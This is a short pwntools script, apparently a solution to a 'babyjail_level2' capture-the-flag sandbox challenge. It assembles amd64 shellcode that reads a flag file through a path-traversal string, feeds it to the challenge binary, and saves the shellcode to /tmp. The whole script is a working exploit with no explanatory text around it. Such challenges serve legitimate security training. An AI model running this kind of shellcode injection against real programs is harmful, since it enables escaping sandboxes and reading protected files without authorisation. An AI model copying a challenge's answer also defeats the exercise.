from pwn import *
context.arch = 'amd64'
context.os = 'linux'

shellcode = shellcraft.amd64.linux.cat("../../../../../../../flag")
p = process(argv=["/challenge/babyjail_level2","/etc/passwd"])
p.send(asm(shellcode))
p.interactive()
with open("/tmp/dem0","wb") as f:
     f.write(asm(shellcode))
